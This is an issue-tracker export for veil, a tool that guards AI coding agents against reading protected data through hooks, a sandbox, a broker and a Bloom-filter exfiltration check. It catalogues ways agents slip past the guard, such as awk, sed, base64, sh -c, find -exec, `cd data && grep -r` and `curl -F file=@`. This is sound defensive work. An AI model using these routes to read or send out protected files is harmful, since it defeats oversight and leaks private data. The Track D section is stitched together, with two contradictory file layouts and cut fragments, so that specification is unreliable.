title: Track A: directory-scope Grep and content search
description:
Parent: Veil v1 epic.

PROBLEM: Grep tool with output_mode=content and path=data/ (a protected directory) is ALLOWED; only a file path is denied. Bash 'grep ssn data/x.csv', 'grep -r ssn data', 'rg ssn data/' are ALLOWED. Content-mode search is a raw read.

DESIGN: In src/evaluator.rs for the Grep tool: if output_mode is content (or unset? check Claude Code default: files_with_matches) and the path is a directory, deny when the directory is inside or contains any protected pattern root, or when any protected pattern glob could match a file under it. For Bash grep/rg/ag/ack/ugrep: treat as reader commands under the argv rule; -l / --files-with-matches / -c only -> allow with audit (names and counts, not content).

TESTS: Grep content on dir, on file, files_with_matches on dir; Bash grep -l vs grep; rg --files.
acceptance_criteria: Regression coverage shows protected-directory content searches and Bash grep/rg content reads denied, while filename/count-only searches remain metadata-only and audited.
notes:
TRIAGE 2026-10-27 (validated, root-caused)
Problem: Grep content searches on directories and Bash grep/rg reads are not screened as file reads. Searching an ancestor of protected roots can therefore expose matching raw content to the agent.
Root cause: extract_grep_path extracts one path; evaluate_access checks only that exact path. SafePathMatcher's /** rule matches descendants, not ancestor directories. Bash command_paths recognizes cat/bat/less/more/head/tail but omits grep and rg. (src/extract.rs:126-146,251-257; src/evaluator.rs:88-98,217-223; src/allowlist.rs:134-145)
Validated: Static trace confirms omitted output_mode defaults to ReadsContents, but ancestor directories do not match protected roots and grep/rg yield no Bash candidates. Current main source matches local. This is under bd-30b Track A and blocks bd-1m2/bd-sel; no tests or live session run.
Evidence: src/extract.rs:126-146; src/extract.rs:251-257; src/evaluator.rs:88-98,217-223; src/allowlist.rs:134-145
Done when: Regression coverage shows protected-directory content searches and Bash grep/rg content reads denied, while filename/count-only searches remain metadata-only and audited.
Direction (hint, engineer decides): Match directory searches against protected roots beneath or above the supplied path, and extract grep-family argv paths with content-versus-metadata exposure.

comments.author: BrownChapel
comments.text:
EVIDENCE bd-1si (BrownChapel, 2026-11-25). Implemented and pushed; NOT closed. Commits on origin/main: 4e5d653 (feature), f37b633 (option tables checked against installed rg/ugrep).

ROOT CAUSE FIXED: only the exact path was checked and `dir/**` matches descendants, so a content search of an ancestor (or of the protected root itself) was allowed. Grep with no `path` extracted no candidate at all.

WHAT CHANGED
- src/allowlist.rs: SafePathMatcher::scan_directory(dir, max_entries) -> DirectoryScan::{Protected(path), Clear, Unverified}. Breadth-first walk; a directory is a protected root when a file placed in it would match (probe), which also covers the start directory; symlinks are not descended into but count when their target is covered (grep -R / rg -L); unreadable dirs skipped; budget exhaustion is Unverified, never Clear.
- src/evaluator.rs: before the allowlist, a ReadsContents access to an existing directory is walked (budget DIRECTORY_SCOPE_MAX_ENTRIES = 200,000) and denied through the normal policy mode (deny/warn/log) when anything covered sits beneath it, or when the directory cannot be inspected within the budget. The reason does not name the protected file.
- src/extract.rs: Grep with no/empty `path` = search of cwd; output_mode `count` is metadata-only like `files_with_matches`. Bash: grep/egrep/fgrep/zgrep family, ugrep/ug, rg, ag, ack parsed (option tables, pattern vs operands, recursion, metadata flags). Names/counts flags (-l -L -c -q, rg --files/-l/-c/--count-matches, ag -l/-c/-g, ack -l/-f/-g) => MetadataOnly. A recursive search with no operand (rg/ag/ack always, grep -r/-R/-d recurse, ugrep -r/-1..-9) searches cwd. -f/--file pattern files are content reads even with -l. A shell wildcard operand is kept literally and, when recursive, also as the directory before the wildcard.
- README.md: documents the behaviour and two limits.

ACCEPTANCE: "protected-directory content searches and Bash grep/rg content reads denied, while filename/count-only searches remain metadata-only and audited" -> MET for the forms listed above, shown by tests that run the real `veil` binary against real directories (tests/directory_scope.rs) plus unit tests with real temp trees.

EVIDENCE (re-executed at f37b633; working tree has only unrelated .beads/crates changes)
- cargo test --locked --lib --test directory_scope --test allowlist --test spine_denied_flags --test bare_invocation --test protected_corpus => 178 lib, 19 allowlist, 5 bare_invocation, 8 directory_scope, 19 protected_corpus, 6 spine_denied_flags passed, 0 failed.
- cargo clippy --locked --lib --bin veil --test directory_scope --no-deps -- -D warnings => exit 0. rustfmt --edition 2024 --check on my files clean.
- Mutation checks (each turned tests red, files restored byte-identical by md5): scan disabled in the evaluator => 6 evaluator + 4 directory_scope tests fail; short names/counts flags ignored => 2 extract + 1 directory_scope fail; Grep no-path default removed => 1 extract + 1 directory_scope fail.
- ubs: 3-4 "critical" per file set, all false positives in lines I did not write (allowlist.rs wildcard matcher `pattern[0] == b'*'`, evaluator.rs:940 and extract.rs:1500 pre-existing test asserts); nothing in new code. The pre-commit hook also staged .beads/issues.jsonl into 4e5d653 (br state of all agents), not a path I passed.
- Real tools: installed rg 15.2.0 and /usr/bin/grep (it is ugrep 7.8.4 on this machine) were run on a scratch dir: -l/-c/-L/-q/--files/--count-matches print names/counts only; `grep -r ssn .` and `rg ssn` print content, and rg with no path searches cwd even with a non-tty stdin. ag and ack are NOT installed: their option tables are from documentation and unchecked. ugrep rejects abbreviated long options; I did not test GNU grep (not installed).
- Hook latency (veil release build, one machine, scan of a content-searched directory, no protected data found): 26,528 entries 0.12 s warm / 1.2 s cold; at the 200,000-entry budget ~0.95 s warm / 2.9 s cold (a 1.7M-entry tree is refused at the budget). No walk happens when no `protected` patterns are configured, the access is not a content read, or the path is not a directory (one stat for a content read).

KNOWN GAPS (not fixed here)
1. Not recognised as searches: `git grep`, `find -exec grep`, `xargs grep`, `sh -c "grep ..."`, variables/`$(...)`/`~`/brace expansion in operands. Only the FIRST simple command of a pipeline is analysed and `&&`/`;` are not separators (pre-existing: `cd data && grep -r x .` or `cat x | grep` bypass). Belongs with the bypass matrix (bd-sel).
2. The Grep tool's `glob` and `type` filters are ignored, so a search of a directory that holds protected data is denied even if the filter would skip it; the agent must search a narrower path. Over-blocking, not under-blocking.
3. Directories over 200,000 entries are refused rather than assumed clean (a repo root with big node_modules/target and a protected dir configured will need a narrower path). Budget is a constant, not config.
4. Wildcard operands: without -r a wildcard expanding to a protected file is only caught when the literal text matches a pattern (same as `cat`). With a recursive search the directory before the wildcard is scanned, which can over-block (`rg pat *.rs` in a repo with a protected dir).
5. Built-in sensitivity packs (.env, keys) found beneath a searched directory are NOT considered; only `[sensitivity] protected` patterns are. `grep -r` reads .env; the Grep tool (ripgrep) skips hidden/ignored files by default, but veil walks everything.
6. Non-Claude protocols (Gemini grep_search, Copilot, Grok) use other argument names; they now get the cwd-scope check when `path` is absent but their own path argument (e.g. dir_path) is not read. Not tested.
7. Heredoc'd shell bodies (`bash <<EOF ... grep -l ...`) are treated as content reads, so names-only searches inside them are over-blocked.

title: Track A: MCP tool argument screening for protected paths
description:
Parent bd-30b. Depends on bd-29r (argv rule).

WHY: Claude Code fires PreToolUse for mcp__* tools as well. Cairn's send path (email/chat tools) passes attachment paths and file ids as string arguments. Today veil ignores non-Read/Grep/Bash tools entirely, so an agent can hand a protected file to a send-email MCP tool with no decision recorded. This is the mechanical form of bd-3mr / bd-37u.

DESIGN: In src/hook.rs, for any tool_name starting with mcp__ (and for Claude Code's WebFetch/NotebookRead style tools with path-like args), walk tool_input recursively; every string value that resolves to an existing path (absolute, ~, or relative to cwd) is screened with the argv rule; protected -> policy decision with class 'mcp_argument' and the JSON pointer of the offending field in the reason. Arrays of attachments handled. Non-path strings are never inspected for content (veil is a path guard). Config: [mcp] screen = true; [mcp] ignore_tools = [] for tools whose arguments are known not to be paths.

HOOK INSTALL: veil install adds a PreToolUse matcher for 'mcp__.*' (pipe-delimited alternation already supported since bd-nff). veil doctor checks it.

TESTS: fixtures for a send-email tool with attachments[] of protected paths, a file-upload tool with a single path, a non-path string that looks like a path but does not exist (allow), nested objects; hook install/uninstall idempotence with the new matcher.

title: Track B: broker daemon and veil exec client
description:
Parent: Veil v1 epic. Depends on B1.

WHAT: 'veil sandbox' starts a broker (same binary, --broker mode) listening on a per-session unix socket under ~/.cmdrvl/state/veil/broker/<session>.sock (0600). Protocol: newline-delimited JSON {"tool":"shape","argv":[...],"cwd":...}; never a shell string. Broker checks tool basename against [spine] authorized_tools, resolves the binary via PATH captured at launch, refuses argv containing shell metacharacters that would need a shell, runs it with the operator's real permissions, streams {stream, chunk} frames and a final {exit_code}. Every call is audit-logged with enforcement:'sandbox', origin:'broker'.

CLIENT: 'veil exec <tool> [args]' inside the sandbox; also honor VEIL_BROKER_SOCKET. Hook remediation text inside a sandbox says 'run: veil exec shape <path>'.

SECURITY: the broker is the only privileged path; keep it tiny, no config reload, dies with the sandbox parent (SIGHUP/pidfd). Rate-limit and size-cap output (spine tools emit metadata; 16 MiB cap).

TESTS: protocol unit tests; integration test launching broker + client with a fake 'shape' script; rejection tests (unauthorized tool, shell metachars, path escape).

AMBITION ROUND ADDITIONS (2026-09-02): (a) FLAG POLICY: each authorized tool declares flags that raise its output label to protected (shape --explicit, rvl --raw, profile --dump, canon --show-values); the broker refuses them with reason broker_flag_forbidden. Without this the broker is cat with extra steps. Config: [spine.flags] shape = ["--explicit"] etc., with built-in defaults for the cmdrvl spine tools. (b) OUTPUT SCANNING: before returning stdout the broker runs the shared boundary-detectors packs (crate extracted in airlock bead al-34s; pinned dependency) and refuses (default) or redacts output that trips secrets/PII/tabular-dump detectors, recording the refusal with detector id and span hash. (c) DERIVED REGISTRY: every returned output (and any file the tool wrote under --out) is hashed and appended to ~/.cmdrvl/state/veil/derived.jsonl {hash, tool, argv_hash, session, ts}; the provenance allowlist bead consumes this. (d) LINUX: apply a seccomp filter to the sandboxed tree denying ptrace, process_vm_readv/writev and opening /proc/<pid>/mem so an adversarial agent cannot read broker memory; macOS relies on seatbelt's default debugging denial - document.

REFINEMENT ROUND 1 (2026-09-02): deliver 'veil exec <tool> [args]' DIRECT MODE first (no sandbox, no socket): validates tool + flag policy, runs the tool, scans output with boundary-detectors, registers output hashes in derived.jsonl, audits. This gives Track A the derived registry (bd-3qw) without waiting for the sandbox; the broker daemon is the same code path behind a socket. Step order: 1 direct mode, 2 socket protocol, 3 daemon lifecycle.
notes:
2026-11-24 review notes:
- Reuse the `[spine.denied_flags]` table from the P0 hook-mode flag guard (`--explicit`, `--raw`, `--dump`, `--show-values`) so hook and broker enforce identical flag policies.
- Scan broker stdout with the shared `boundary-detectors` crate before returning frames to the sandboxed agent (including recursive base64/hex decode-and-rescan).
- Concurrency/runtime: broker daemon may stay tiny sync thread-per-connection OR use `asupersync` for cancel-correct streaming & parent-death teardown; NEVER pull an async runtime into `veil` hook mode (<1ms startup budget).

title: Track A: path-anywhere-in-argv rule replaces the reader allowlist
description:
Parent: Veil v1 epic.

PROBLEM: src/extract.rs only recognizes cat/bat/less/more/head/tail plus a few interpreters. awk 1 data/x.csv, sed -n p data/x.csv, base64/xxd/perl/jq/sqlite3/duckdb/grep/rg on a protected file are all ALLOWED (probe 2026-09-02). So are cp/tar/curl -F file=@ which move the bytes somewhere unguarded.

DESIGN: After shell decomposition (sibling bead), for every simple command: resolve each argv token that looks like a path (contains / or a known file extension, or resolves to an existing file relative to cwd) to an absolute path. If any resolved path is protected/sensitive under the existing classification, the command is resolved through policy UNLESS the command basename is in [spine] authorized_tools. The old reader list stays only as an explanation hint ('cat is a direct reader'). Keep the existing fast path: commands with no path-like tokens are allowed silently.

EDGE CASES: tokens like 2>/dev/null and dir> currently get logged as paths (see audit log) - the shell decomposer must strip redirections before argv resolution and treat '< protected' as a read (already denied). Ignore /dev/*, /proc/*. Never stat more than 64 tokens per command (perf budget < 1ms).

REASON CLASSES: add 'argv_path' to the audit reason vocabulary so operators can distinguish direct readers from generic path references.

TESTS: unit tests per vector in the bypass matrix bead; golden fixtures for awk/sed/jq/base64/xxd/perl/sqlite3/duckdb/cp/tar/curl/scp/rsync/zip; false-positive guards: 'ls data/', 'wc -l data/x.csv' (policy decision: wc leaks counts only - ALLOW with audit), 'shape data/x.csv' allowed, 'git add data/x.csv' allowed (not a read into context).

AMBITION ROUND ADDITIONS (2026-09-02): (a) Protected-pattern matching moves to a segment radix trie with glob leaves (src/allowlist.rs + src/config.rs) so 10k patterns still resolve in < 1 ms; add a criterion-free timing test with 10k synthetic patterns. (b) Frame decisions in the label model from docs/plan.md 'Formal model': files carry public < derived < protected; the agent's clearance is derived; this rule is 'protected path referenced by a non-broker command'. Reason strings should say which label was hit.

description:
Parent: Veil v1 epic. Blocks the argv rule bead (the rule needs simple commands as input).

title: Veil v1: honest hook + OS sandbox enforcement
description:
Epic from the 2026-09-02 reality check (docs/plan.md, section 'Gap Closure Plan').

WHY: veil 0.4.1 is installed and has stopped real reads of .env and ~/.cmdrvl/config, but it is a shell-text parser with a fixed reader list. A 36-vector probe against a protected directory ALLOWED 22 reads: awk/sed/base64/xxd/perl/jq/sqlite3/duckdb/grep/rg on the file; sh -c, find -exec, xargs, $(cat), variable indirection; cp-then-cat, tar|base64; python3 script.py, uv run python -c; curl -F file=@; Grep tool content mode on a directory. Parser denylisting cannot beat indirection, so the story 'the agent cannot read your private data' is not mechanically true today.

GOAL: Two tracks. Track A (0.5): make the hook honest and much harder to trip accidentally: path-anywhere-in-argv rule, shell decomposition, dynamic-arg stance, interpreter script inspection, directory-scope Grep, egress commands, enforcement-level disclosure generated from a committed bypass matrix. Track B (1.0): OS sandbox enforcement: veil sandbox launches the harness with protected paths unreadable (seatbelt on macOS, Landlock on Linux) and a broker daemon runs authorized spine tools outside the sandbox.

DONE WHEN: the committed bypass matrix shows 36/36 denied under sandbox and every Track A vector denied under hook-only; veil doctor reports enforcement level; README claims are generated from the matrix.

NON-GOALS: Write/Edit guarding, PostToolUse output filtering, outbound message-body policy (KOVREX/wrapper).

title: Track A: content-sniff classification via boundary-detectors
description:
Parent bd-30b. Depends on bd-29r; related to airlock al-34s (shared crate) and supersedes bd-28k (magic bytes).

WHY: files outside protected directories are public by default (fail-open). An export renamed to notes.txt or dropped in ~/Downloads is readable. Extension renames defeat glob packs.

DESIGN: For a Read/Grep/argv decision on a file outside protected dirs and not on the safe allowlist, veil (the hook process, never the agent) reads the first 4 KiB: (1) magic bytes: SQLite header, parquet PAR1, zip with xl/ (xlsx), %PDF, gzip/zstd -> label protected (databases and documents are sensitive by policy default; data.database pack already says so). (2) PII density via boundary-detectors: SSN, Luhn-valid card numbers, E.164 phones, emails per KiB; per-detector thresholds in [sniff]; files under a git work tree are exempt from the email detector (commit trailers). (3) Decision cached in ~/.cmdrvl/state/veil/sniff-cache.jsonl keyed by (dev, inode, mtime, size); cache hit costs no I/O. Budget: sniff adds at most one 4 KiB read; skip if the 1 ms budget is already spent (fail-open, audit 'sniff_skipped').

TESTS: fixtures for renamed sqlite/parquet/xlsx/pdf; a CSV of SSNs named readme.txt; a source file with many emails (allow); cache invalidation on mtime change; budget skip path.

title: Track D: protected-corpus one-way shingle Bloom filter handed from `veil sandbox` to `airlock gate`
description:

If any protected-file chunk tries to leave the machine via an LLM API request (even renamed, paraphrased slightly, or base64/hex encoded), `airlock gate` blocks it with 403 and records a `PROTECTED_CORPUS_MATCH` finding.

Airlock must parse with `ProtectedBloom::from_bytes` from the same pinned boundary-detectors git rev and must NOT reimplement normalization, shingling or hashing: one differing constant and the filter silently never matches. The layout below describes the crate, it does not replace it.

FILE LAYOUT (little-endian, v1):
  0..4    "BDSB"                 magic
  4       u8   format version = 1   (from_bytes rejects any other)
  5       u8   log2_bits, 10..=30   (filter has 2^log2_bits bits)
  6       u8   hashes, 1..=16       (bits set per shingle)
  7       u8   sample_mask          (veil uses 7: one byte-window in eight is sampled)
  8..16   u64  salt                 (mixed into every hash; stored in the header; NOT a secret)
  16..24  u64  inserted             (count of shingles inserted; a count, not content)
  24..    2^log2_bits / 64 u64 words (the bit array)
  total length = 24 + 2^log2_bits / 8 bytes; depends only on log2_bits, never on corpus content.
  Largest valid file: 24 + 2^30/8 = 134,217,752 bytes. Reader should reject longer input before parsing; from_bytes then checks the exact length against the header geometry.

PARAMS TRAVEL IN THE HEADER: no out-of-band agreement on geometry, salt or sampling is needed.

HASHING, for reference only (do not reimplement):
- Normalize: ASCII letters lowercased; digits and bytes >= 0x80 kept; every other run of bytes becomes one space; none at the ends.
- Byte shingles: 64 normalized bytes, rolling polynomial hash (base 0x9E3779B97F4A7C15), keep when ((key*0x9E3779B97F4A7C15)>>56) & sample_mask == 0, then mix64.
- Word shingles: 8 normalized words (FNV-1a per word, rolling polynomial base 0x2545F4914F6CDD1D), all windows kept, then mix64.
- Bit n of a shingle with hash h: (h + n*step) & (2^log2_bits - 1), step = mix64(h ^ 0xC2B2AE3D27D4EB4F) | 1, n in 0..hashes.
- Match: payload shingles found in the filter >= min_bloom_hits (crate default 3). Blob decode (base64/hex/data:) and rescan is in the crate's scan(); a copied or encoded paragraph is found at decode_depth >= 1.
- Lines skipped at build time (boilerplate): imports/includes, license/copyright headers, lines under two words (BoilerplateFilter::default_code).

DELIVERY CONTRACT (veil side commits to this):
- `--protected-bloom` receives an absolute path to a regular file named `protected-corpus.bdsb`, mode 0600, in a directory with no group/other permissions, outside the sandbox-readable set. Created with create_new (never overwrites, never follows a final symlink).
- Veil OMITS the flag when the protected set yields no files. It never passes an empty filter.
- Airlock side: treat the argument as an opaque path, open and read to EOF (do not rely on stat length or seek), so a later /dev/fd/N from the launcher works unchanged. Read once at startup, keep in memory, never write filter bytes or matched text to manifests, witness or logs. If given and missing/unreadable/bad magic/bad version/wrong length: exit non-zero at startup, never run unfiltered.

STILL OPEN: whether the manifest records a digest of the filter file (suggest no unless a named consumer, e.g. al-1th, needs it).

- Corpus = regular, non-symlink, non-binary files under the repo root and under the literal roots of absolute `[sensitivity] protected` patterns, selected by the SAME SafePathMatcher the hook uses (the matcher is a floating match on absolute paths).
- Limits, configurable: max_files (planned default 2000), max_bytes total (64 MiB), max_file_bytes per-file read cap (4 MiB), plus a walk-entries bound. Over budget: files are taken in ascending salted hash of their root-relative path, so the chosen subset does not depend on directory order or checkout location. Everything skipped or truncated is counted in a report (sampled out, truncated, binary, unreadable, symlinks, walk truncated) so the launcher can warn or refuse; nothing is dropped silently.

Path goes to `airlock gate --protected-bloom <path>`.

3. LAYOUT (little endian; length = 40 + m_bits/8)
   0..4    magic "BDBL"
   4       version u8 = 1
   5       k_hashes u8 (1..=32; veil's default sizing gives 16)
   6       shingle_words u8 = 8 (>= 3)
   7       window_bytes u8 = 64 (>= 24)
   8..16   m_bits u64 (multiple of 8, 1..=536,870,912)
   16..24  inserted_shingles u64 (counts duplicates)
   24..40  salt [u8;16] (veil writes b"cmdrvl-bdbl-v001"; not a secret)
   40..    bitset, m_bits/8 bytes
   Maximum file: 40 + 67,108,864 = 67,108,904 bytes.
   Hash: blake3(salt || shingle); h1 = first 8 bytes LE, h2 = next 8 bytes LE | 1; bit i of a shingle = (h1 + i*h2) mod m_bits, byte = bit/8, mask = 1 << (bit%8).
   Parse with ShingleBloom::from_bytes: strict (TruncatedHeader, InvalidMagic, UnsupportedVersion, InvalidParameters, BitsetLengthMismatch). The gate must treat any error as fatal at startup. Never run unfiltered when --protected-bloom was given.

4. WHAT IS IN IT
   Per file: text lossy-decoded from UTF-8, whitespace collapsed to single spaces, ASCII lowercased. Shingles = every 8-word window whose joined length is >= 24 bytes, plus a 64-byte window every 16 bytes from the start of that file's normalized text. No separators, no file index, no text.

5. SIZING veil uses

I did not measure corpora of that size.
   File size depends only on planned bytes (file lengths, capped), not on content.

6. LIMITS (veil config [protected_corpus]; defaults) max_files 2000, max_bytes 64 MiB, max_file_bytes 4 MiB, max_walk_entries 500,000. Over budget: files taken in ascending salted hash of root-relative path (independent of directory order and checkout location). Binary files (NUL in first 8 KiB) and symlinks are skipped. CorpusReport counts everything not covered and is_complete() says whether any limit or I/O error left protected text out.

Finding: Pack::ProtectedCorpus, rule_id "PROTECTED_CORPUS_MATCH", severity Critical, byte_span (0, len of that text level), depth 0, or >= 1 when the text was found inside a decoded base64/hex candidate.

The crate has no boilerplate filter, and code shares idioms, docs and generated code, so a protected corpus of SOURCE CODE will match unrelated code more. Suggest 8 for prose/data corpora (catches excerpts of ~150 B and up, above the measured code noise); airlock should make it policy-configurable and not hard-code 2. veil does not write it into the file.
   c) Compact data with no whitespace (one long hex/base64 token, minified rows) is covered only by the 64-byte windows every 16 bytes from file start, so an excerpt is found only at the same offset mod 16: a 1000-byte excerpt of a 4000-byte hex token was found at 2 of 32 offsets. title: Decouple veil operator preflight from hard-requiring Claude Code hooks and third-party dcg
description:
## Background & Evidence
`veil/README.md:227-230` documents: *"Operator/domain commands fail closed unless the active Claude `PreToolUse` settings contain healthy `veil` Read/Grep/Bash hooks and a healthy `dcg` Bash hook."*

Hard-coupling `veil`'s operator surface to both Claude Code's specific `~/.claude/settings.json` hook format AND third-party `dcg` blocks adoption by agents running in Codex CLI, Gemini CLI, Cursor, CI sandboxes, or teams that do not install `dcg`. (Complements `bd-3fq` harness matrix testing and `bd-grok-dual-payload-jr0`.)

## Goal
Make harness & companion-guard preflight configurable and harness-agnostic:
- Detect active harness cleanly (Claude Code, Codex, Gemini CLI, Cursor, plain shell/sandbox) rather than assuming Claude Code `PreToolUse`.
- Make `dcg` companion enforcement an opt-in policy toggle (`[policy] require_dcg = false` by default for open-source users, `true` in strict personal/enterprise profiles) instead of an unconditional fail-closed blocker.
- Surface detected guard posture clearly in `veil doctor health --json` and `veil --robot-triage` so agents know exactly what enforcement is active.
acceptance_criteria: veil operator commands work cleanly without dcg installed by default (with opt-in require_dcg policy) and support non-Claude harnesses, verified by unit and E2E tests.
close_reason: Verified by orchestrator at 28b9dfc (clean tree): cargo test --test doctor = 14 passed; cargo test --bin veil = 61 passed. Diff checked for gate weakening: one removed assertion (dcg missing) was replaced by the equivalent require_dcg=true refusal plus 4 new tests. Not verified: Codex/Gemini/Cursor env markers vs live sessions (VEIL_HARNESS override is the reliable path). Process note: agent used a python one-off and shell splice to edit source, against repo rules; disclosed by the agent.

title: Grok hook payload is classified as Claude Code and denies read_file and run_terminal_command
description:
Follow-up to bd-w62, closed 2026-08-31 in b86ab28. That change added HookProtocol::Grok for a camelCase payload (`hookEventName` `pre_tool_use`, `toolName`, `toolInput`). The live Grok payload still matches Claude Code first, so the Grok parser never runs.

Observed 2026-09-28 in a Grok session whose PreToolUse hook was the installed veil binary. `read_file` and `run_terminal_command` were denied. `grep` was not. The deny text was veil's own error:

- `unsupported Claude Code tool `read_file` in hook payload`
- `unsupported Claude Code tool `run_terminal_command` in hook payload`

That string is only produced in `normalize_tool_kind` for `HookProtocol::ClaudeCode` (`src/hook.rs`). So the payload was classified by `is_claude_payload`: `hook_event_name == "PreToolUse"` plus `tool_name` plus `tool_input`, and `tool_name` was the Grok native name. `grep` passed because Claude's allow-list includes `grep`.

Grok's documented stdin (`~/.grok/docs/user-guide/10-hooks.md`) sends both event keys: `hookEventName: "pre_tool_use"` and `hook_event_name: "PreToolUse"`, with camelCase `toolName` / `toolInput`. The live denial proves a snake_case `tool_name` is also present and set to `read_file` or `run_terminal_command`. `parse_hook_input` checks `is_claude_payload` before `is_grok_payload`, and `is_grok_payload` only looks at camelCase `toolName`.

The operator removed the veil PreToolUse hooks so the session could continue. The bug is in classification, not in the hook having been removed.

## Change
1. In `src/hook.rs`, classify a payload as Grok when it is Grok's event, even if the Claude-compat keys are also present. `hookEventName == "pre_tool_use"` is sufficient. A snake_case `tool_name` of `read_file`, `run_terminal_command`, or `run_terminal_cmd` is also Grok: those names are never Claude tools. Check this before `is_claude_payload`.
2. Parse either layout, and a payload that carries both. Prefer camelCase `toolName` / `toolInput` / `sessionId` when present, otherwise `tool_name` / `tool_input` / `session_id`. `cwd` is the same key in both.
3. A real Claude payload stays Claude: `hook_event_name: PreToolUse`, `tool_name: Read|Grep|Bash`, and no `hookEventName: pre_tool_use`. Do not treat a bare `tool_name: grep` as Grok.
4. In `src/extract.rs`, `extract_read_path` reads `file_path` or `path`. Grok's `read_file` argument is `target_file`. After classification is fixed, a protected file passed as `target_file` must still be a candidate. Missing it fail-opens the read.

## Tests
Add them in `src/hook.rs` and the extract tests.

- Dual-key Grok read: `hookEventName` `pre_tool_use`, `hook_event_name` `PreToolUse`, `toolName` and `tool_name` both `read_file`, `toolInput` / `tool_input` `{"target_file":"secret.txt"}`. Protocol Grok, tool Read.
- Snake-case-only Grok bash: `hook_event_name` `PreToolUse`, `tool_name` `run_terminal_command`, `tool_input` `{"command":"npm test"}`. Protocol Grok, tool Bash. This is the shape that produced the live error.
- Claude control: `tool_name` `Read` and `tool_input` `{"file_path":"secret.txt"}` with no Grok event key. Protocol stays ClaudeCode.
- Extract: a Grok read whose only path field is `target_file` produces that path as a candidate.

## Acceptance
- The three payloads above parse as specified, and the `target_file` path is extracted.
- Existing Claude, Gemini, Copilot, and camelCase-only Grok tests still pass.
- `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, and `cargo test` pass.
- Reinstalling veil into the Grok PreToolUse hook is a follow-up after the binary is rebuilt. It is not part of this bead.

title: Shared crate: create and consume `boundary-detectors` (secrets, PII, tabular, base64/hex decode, shingle Bloom)
description:
Both `veil/docs/plan.md` (content sniff bd-35u + Track B broker stdout scan bd-27o) and `airlock/docs/airlock_plan.md` (detector packs al-34s + policy-proxy gate) depend on a shared `boundary-detectors` Rust crate that does not yet exist.

Create a single pure-Rust (`#![forbid(unsafe_code)]`, deterministic, zero ML) `boundary-detectors` crate shared by `veil` and `airlock` so local content sniffing, broker stdout scanning, and wire egress scanning never drift.
Modules:
- `secrets`: Aho-Corasick literals + regexes (AWS AKIA/ASIA, PEM private keys, JWT, GitHub ghp_/github_pat_, Slack xox*, high-entropy secret assignments >= 3.5 bits/char on 20+ char tokens)
- `pii`: US SSN, Luhn-valid payment cards, email (with git-worktree exemption hook), E.164/US phone, IBAN
- `tabular`: >= N delimited lines with consistent column counts
- `blobs`: base64 runs (>= 512 chars), hex runs, data: URIs, plus bounded recursive decode-and-rescan so base64/hex-wrapped secrets or CSVs are still caught
- `paths`: absolute filesystem paths, ~/ paths, file:// URIs
- `shingle_bloom`: one-way rolling 64-byte / 8-word shingle Bloom filter builder & matcher for protected-corpus exfiltration detection without storing raw text
- `magic`: SQLite, Parquet, XLSX/ZIP, PDF magic-byte sniffing for veil content-sniff classification.

Never echo matched raw values in findings; return hashed spans only.
acceptance_criteria:
- Pure-Rust `#![forbid(unsafe_code)]` crate published or path-wired in `cmdrvl/boundary-detectors` (or shared workspace) and consumed by `veil` and `airlock`.
- Deterministic findings with hashed spans (zero raw secret/PII leakage in findings or logs).
- Bounded recursive base64/hex decode-and-rescan catches base64-encoded CSV/PII/secrets.
- Shingle Bloom builder/matcher builds a serializable one-way filter from protected files (excluding configurable boilerplate) with <1% false positive rate on normal code/prompts.
- Benchmarks prove <1ms latency on typical 4 KiB veil sniffs and <5ms on 256 KiB broker/airlock payloads.

title: veil doctor's dcg-hook check requires exact 'Bash' matcher, but dcg installs under 'Bash|PowerShell'
description:
veil doctor's hooks check (inspect_dcg_entries in src/hooks.rs) does exact string equality on the PreToolUse entry's matcher field, only recognizing a matcher literally equal to "Bash" (matcher_matches(entry, "Bash") called from inspect_dcg_entries, src/hooks.rs ~L144-161; exact-eq matcher_matches at ~L270-275).

dcg's own installer (dcg install) registers its hook under the combined matcher "Bash|PowerShell" in a single PreToolUse entry, which functionally covers Bash calls but never satisfies veil's exact-match check. Result: veil doctor permanently reports 'missing dcg Bash hook' / status action_needed even when dcg is correctly installed and working, which cascades into cins's guard preflight (required_guards: [dcg, veil], both must report ok=true) refusing to run at all.

Reproduced 2026-08-31: dcg doctor reported hook_wiring=ok with the hook under 'Bash|PowerShell'; veil doctor simultaneously reported hooks=action_needed / 'missing dcg Bash hook'. Restarting Claude Code (to pick up hook config changes) did not fix it -- the settings.json shape never satisfies veil's check regardless of restart.

Attempted workaround: added a second PreToolUse entry with matcher exactly "Bash" pointing at the same dcg command, alongside the existing "Bash|PowerShell" entry. This satisfied veil doctor (hooks=ok) but broke dcg doctor's own hook_wiring check ('Found 2 dcg hook entries (expected 1)', status=warning). Neither tool's own remediation path produces a state both doctors accept simultaneously. Reverted the workaround; no fix currently exists at the settings.json level.

Fix needs to happen in one of the two tools:
- veil: relax inspect_dcg_entries's matcher_matches to recognize any matcher string containing "Bash" (e.g. "Bash", "Bash|PowerShell"), not just exact-equal "Bash", OR
- dcg: register two separate PreToolUse entries (exact "Bash" and exact "PowerShell") instead of one combined entry, and reconcile dcg doctor's hook_wiring count check to allow that shape.

Blocks: email-triage's cins guard preflight, and presumably any other cins invocation on this machine.
close_reason: Fixed in commit 0875ac5 (main): matcher_matches now treats a PreToolUse matcher as a pipe-delimited alternation instead of exact string equality, so dcg's real Bash|PowerShell matcher is recognized. Verified against live ~/.claude/settings.json with a source build (veil doctor now reports healthy). Live installed binary is via Homebrew (0.4.0); needs a tagged release + brew bump to reach the installed binary -- source fix is complete and pushed.

comments.author: Zac
comments.text:
Corroborating evidence (2026-08-31): src/hooks.rs L9 defines MANAGED_MATCHERS = ["Read", "Grep", "Bash"] -- veil always installs itself as three separate single-tool matcher entries, never a combined "Read|Grep|Bash" string. inspect_dcg_entries's exact-equality matcher_matches(entry, "Bash") check (L144-161, L270-275) was clearly written against that same assumption: every managed hook, including a well-behaved third-party one, was expected to register under a bare tool-name matcher. dcg is the only participant that deviates by combining Bash+PowerShell into one pipe-delimited matcher string, which is why it's the one hook veil can never find.

This confirms the fix belongs on veil's side rather than being an arbitrary policy call: matcher_matches should treat a managed hook as covering "Bash" if the entry's matcher is Bash-only OR a pipe-delimited group containing "Bash" as one of its alternatives (mirroring how Claude Code itself parses `"Bash|PowerShell"` as an alternation, not a literal string). Suggest changing matcher_matches (or adding a dedicated matcher_covers_tool helper) to split on `|` and check membership, then reuse it for both inspect_dcg_entries and the existing managed-hook matcher inspection so future combined-matcher hooks don't hit the same false negative.

title: veil has no protocol adapter for Grok -- every Grok filesystem tool call is hard-blocked
description:
